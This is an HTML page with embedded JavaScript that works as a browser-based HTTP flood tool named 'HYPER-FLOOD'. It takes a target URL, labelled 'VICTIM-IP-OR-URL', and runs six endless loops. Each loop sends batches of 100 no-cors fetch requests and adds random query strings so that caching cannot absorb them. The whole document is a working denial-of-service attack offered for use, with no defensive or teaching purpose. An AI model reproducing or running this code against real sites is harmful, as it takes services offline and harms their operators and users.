<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TERMINAL | HYPER-FLOOD</title>
    <style>
        :root { --main-color: #ff003c; --bg-color: #050505; --accent-color: #00f2ff; }
        body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', Consolas, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        /* Cyberpunk Container */
        .terminal { width: 90%; max-width: 500px; border: 2px solid var(--main-color); background: rgba(0,0,0,0.9); box-shadow: 0 0 20px var(--main-color); position: relative; padding: 20px; }
        .terminal::before { content: "SYSTEM_ACCESS_GRANTED"; position: absolute; top: -10px; left: 20px; background: var(--main-color); color: #000; font-size: 10px; padding: 2px 10px; font-weight: bold; }

        h1 { text-align: center; text-transform: uppercase; letter-spacing: 5px; margin: 0 0 20px 0; font-size: 24px; text-shadow: 0 0 10px var(--main-color); }
        
        .input-group { position: relative; margin-bottom: 20px; }
        input { width: 100%; background: #111; border: 1px solid #444; color: var(--accent-color); padding: 12px; box-sizing: border-box; outline: none; border-left: 4px solid var(--main-color); }

        /* Stats Grid */
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .stat-card { border: 1px solid #333; padding: 10px; text-align: center; background: #0a0a0a; }
        .label { font-size: 10px; color: #888; display: block; margin-bottom: 5px; }
        .value { font-size: 22px; font-weight: bold; color: #fff; }

        /* Action Buttons */
        .btn-fire { width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 18px; transition: 0.3s; position: relative; overflow: hidden; }
        .active { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
        .idle { background: var(--main-color); color: #fff; }
        .btn-fire:active { transform: scale(0.98); }

        /* Matrix Log */
        .log-box { height: 100px; background: #000; border: 1px solid #222; margin-top: 15px; font-size: 10px; color: #00ff41; overflow: hidden; padding: 10px; line-height: 1.5; }
        
        .glitch { animation: glitch 0.2s infinite; }
        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.8; transform: skew(1deg); } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="terminal">
        <h1 id="title">HYPER FLOOD</h1>
        
        <div class="input-group">
            <input type="text" id="target" placeholder="HTTP://VICTIM-IP-OR-URL/">
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <span class="label">REQUESTS SENT</span>
                <span class="value" id="count">0</span>
            </div>
            <div class="stat-card">
                <span class="label">THREAD STATUS</span>
                <span class="value" id="status" style="color: var(--main-color);">IDLE</span>
            </div>
        </div>

        <button id="fire-btn" class="btn-fire idle" onclick="toggleAttack()">Launch Protocol</button>
        
        <div class="log-box" id="log">
            > STANDBY...<br>
            > AWAITING TARGET ENTRANCE...
        </div>
    </div>

    <script>
        let isAttacking = false;
        let requests = 0;
        let threads = [];

        function toggleAttack() {
            const url = document.getElementById('target').value;
            if (!url.startsWith('http')) return alert("PROTOCOL MISSING: Input URL with http/https!");

            isAttacking = !isAttacking;
            const btn = document.getElementById('fire-btn');
            const status = document.getElementById('status');
            const title = document.getElementById('title');

            if (isAttacking) {
                btn.innerHTML = "ABORT MISSION";
                btn.className = "btn-fire active";
                status.innerHTML = "ACTIVE";
                status.style.color = "#00ff41";
                title.classList.add('glitch');
                addLog("!! ATTACK VECTOR ENGAGED !!");
                startAttack(url);
            } else {
                location.reload(); // Hard stop
            }
        }

        async function startAttack(url) {
            // Hexa-Thread: Membuka 6 jalur async sekaligus
            for (let i = 0; i < 6; i++) {
                burst(url);
            }
        }

        async function burst(url) {
            while (isAttacking) {
                const cluster = [];
                // 100 request per cluster thread
                for (let i = 0; i < 100; i++) {
                    cluster.push(fire(url));
                }
                await Promise.allSettled(cluster);
            }
        }

        async function fire(url) {
            const bypassUrl = url + (url.includes('?') ? '&' : '?') + "burst=" + Math.random();
            try {
                await fetch(bypassUrl, { mode: 'no-cors', cache: 'no-store' });
            } catch (e) {}
            requests++;
            updateUI();
        }

        function updateUI() {
            document.getElementById('count').innerText = requests.toLocaleString();
            if (requests % 500 === 0) {
                addLog(`[+] EXECUTING BURST: ${requests} PACKETS`);
            }
        }

        function addLog(msg) {
            const lb = document.getElementById('log');
            lb.innerHTML = `> ${msg}<br>` + lb.innerHTML;
        }
    </script>
</body>
</html>
